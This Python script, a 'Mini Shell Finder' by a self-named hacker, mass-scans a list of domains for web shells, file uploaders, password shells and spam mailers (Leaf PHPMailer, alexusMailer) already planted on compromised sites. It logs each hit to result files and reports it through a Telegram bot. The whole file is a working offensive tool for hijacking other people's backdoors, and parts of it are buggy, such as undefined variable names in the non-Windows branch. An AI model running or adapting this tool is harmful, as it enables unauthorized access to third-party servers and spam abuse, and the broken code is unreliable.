import os
from typing import Text
import requests
import threading
from multiprocessing.dummy import Pool,Lock
#from bs4 import BeautifulSoup
import time
import string,sys,ctypes
from time import sleep
from random import choice,randint
from requests.api import head
from colorama import Fore
from colorama import Style
from colorama import init
import concurrent.futures
import re
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
Bad = 0
Good = 0
pro = 0
Mailer = 0
Cp = 0
Send = 0
failed = 0
error = 0
Password = 0
def Folder(directory):
  if not os.path.exists(directory):
      os.makedirs(directory)
Folder("result")
def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
def __init__():
      
      os.system("cls")
      
      banner = """

  ______   __    __  ________   ______   ________  ________ 
 /      \ |  \  |  \|        \ /      \ |        \|        /
|  $$$$$$\| $$  | $$| $$$$$$$$|  $$$$$$\ \$$$$$$$$| $$$$$$$$
| $$$\| $$ \$$\/  $$| $$__    | $$__| $$    /  $$ | $$__    
| $$$$\ $$  >$$  $$ | $$  \   | $$    $$   /  $$  | $$  \   
| $$\$$\$$ /  $$$$\ | $$$$$   | $$$$$$$$  /  $$   | $$$$$   
| $$_\$$$$|  $$ \$$\| $$      | $$  | $$ /  $$___ | $$_____ 
 \$$  \$$$| $$  | $$| $$      | $$  | $$|  $$    \| $$     /
  \$$$$$$  \$$   \$$ \$$       \$$   \$$ \$$$$$$$$ \$$$$$$$$
                                                            
                                                            
                                                            
                                                                    
"""
      print(banner)
      os.system("cls")
      print(banner)
def logo():
    print("""     
                 [+] Mini Shell Finder
                 [+] Coded By 0xFaZe
                 [+] CONTACT ME HERE : https://t.me/fazemrx
                 [+] USE URL LIST WITHOUT HTTP/HTTPS 
                      \n \n""")

def finde_it(domain):
    global Bad ,Good, pro, Password, Mailer, error, Cp, Send, failed
    try:
        domain = domain.strip()
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-us,en;q=0.5",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "keep-alive",
        "Cookie": "PHPSESSID=demo;",
        "Cache-Control": "no-cache"}
        for name in open('privat/name.txt','r',encoding="utf-8").readlines():
            name=name.strip()
            url = ('http://'+domain+'/'+name)
            to_domain = requests.get(f"http://{domain}/{name}",url,headers=headers,timeout=3).text
            # ~ print(name,to_domain)
            if 'No route found for "' not in str(to_domain) and 'Apache2' not in str(to_domain) and 'ErrorException' not in str(to_domain):
                if ">public_html" in to_domain:
                    open("result/shell.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name} >> Shell")
                    break
                elif "<span>Upload file:" in to_domain:
                    open("result/random.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name} >> Random Shell")
                    break
                elif 'type="submit" id="_upl" value="Upload">'  in to_domain :
                    open("result/Config.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> Config Shell")
                    break
                elif 'Leaf PHPMailer' in to_domain or '>alexusMailer 2.0<' in to_domain:
                    open("result/Mailer.txt","a").write(f"http://{domain}/{name}\n")
                    Mailer = Mailer + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> LeafPHP-Mailer")
                    break
                elif 'method=post>Password:' in to_domain or '<input type=password name=pass' in to_domain:
                    open("result/password.txt","a").write(f"http://{domain}/{name}\n")
                    Password = Password + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> Password Shell")
                    break
                elif 'name="uploader" id="uploader">' in to_domain:
                    open("result/result.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> Uploader Script")
                    break
                elif "Upload File : <input" in to_domain :
                    open("result/sw.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> Uploader Shell")
                    break
                elif '>alexusMailer 2.0<' in to_domain :
                    open("result/alexus.txt","a").write(f"http://{domain}/{name}\n")
                    Good = Good + 1
                    __________________________ghreigig_________ = requests.post('https://api.telegram.org/bot' + 'YOUR BOT TOKEN' + '/sendMessage?chat_id=' +  'YOUR CHAT ID' + '&parse_mode=Markdown&text=' + url, timeout=10)
                    print(f"[x] http://{domain}/{name}  >> Alexus-Mailer")
                    break
                else :
                            Bad = Bad + 1
                            pass
    except :
        error = error + 1
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('0xFaZe-FINDER |Shell- {} |Not-found- {} |Mailer- {}| Password-{}|Error-{}|email-cp-{} |Send-{} |NW-{}'.format(Good, Bad, Mailer, Password, error, Cp, Send, failed))
    else :
        sys.stdout.write('\x1b]2; Mrx2.5|By FaZeMrx |Shell- {} |Not Found- {}| Mailer-{}| Password-{}|Error-{}|email-cp-{}|Send-{} |NW-{}\x07'.format(Good,Bad, mailer, password,error,cp,send,failed))

def index():
    try:
        lists = sys.argv[1]
        numthread = sys.argv[2]
        readsplit = open(lists).read().splitlines()
    except:
        try:
            lists = input("websitelist ? ")
            readsplit = open(lists,'r',errors='ignore').read().splitlines()
        except:
            print("Wrong input or list not found!")
            exit()
        try:
            numthread = input("threads ? ")
        except:
            print("Wrong thread number!")
            exit()
    try:
        with concurrent.futures.ThreadPoolExecutor(int(numthread)) as executor:
            executor.map(finde_it,readsplit)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    __init__()
    logo()
    index()

